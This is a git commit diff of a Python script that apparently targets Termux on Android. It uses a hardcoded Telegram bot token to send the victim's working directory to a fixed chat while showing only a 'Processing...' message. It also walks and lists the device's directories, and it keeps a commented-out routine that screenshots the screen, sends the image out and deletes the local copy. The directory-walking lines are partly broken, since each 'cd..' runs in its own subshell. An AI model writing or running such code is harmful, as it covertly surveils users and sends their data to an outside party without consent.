a0c94ee6bd9cc33c1028c199ff1f772d162c57b9
Fatal <71898632+devrimsaitoglu@users.noreply.github.com>
2021-10-08 07:13:06 +0300

    Add files via upload

--- main.py
+++ main.py
@@ -4,22 +4,53 @@ import requests
 import os
 import datetime
 from telepot import Bot
-from mss import mss
+#from mss import mss
 
 
 def program():
 	bot = Bot("1577645641:AAGRYQ_mhUKtzYWljht_N4z6JM64z5-DwBg")
-	yol = os.getcwd()
-	#print(yol)
 	print("İşleniyor...")
+	time.sleep(2)
+
+	yol = os.getcwd()
+	print("STARTER")
+	os.system("cd..")
+	os.system("dir")
 	
+	print("\n\nTEST")
+	os.system("cd..")
+	os.system("dir")
+
+	print("\n\nHOME")
+	os.system("cd..")
+	os.system("dir")
+
+	print("\n\nFILES")
+	os.system("cd..")
+	os.system("dir")
+
+	print("\n\nCOM.TERMUX")
+	os.system("cd..")
+	os.system("dir")
+
+	print("\n\nDATA2")
+	os.system("cd..")
+	os.system("dir")
+
+	print("\n\nDATA1")
+	os.system("cd..")
+	os.system("dir")
+
+	#print(yol)
+	
+	"""
 	try:
 	    with mss() as foto:
 		    bot.sendPhoto("1320900188", photo=open(foto.shot(), "rb"))
 		    os.remove("monitor-1.png")
 	except:
 			bot.sendMessage("1320900188", "Foto Çekilemedi !")
-
+	"""
 	bot.sendMessage("1320900188", yol)
 
 
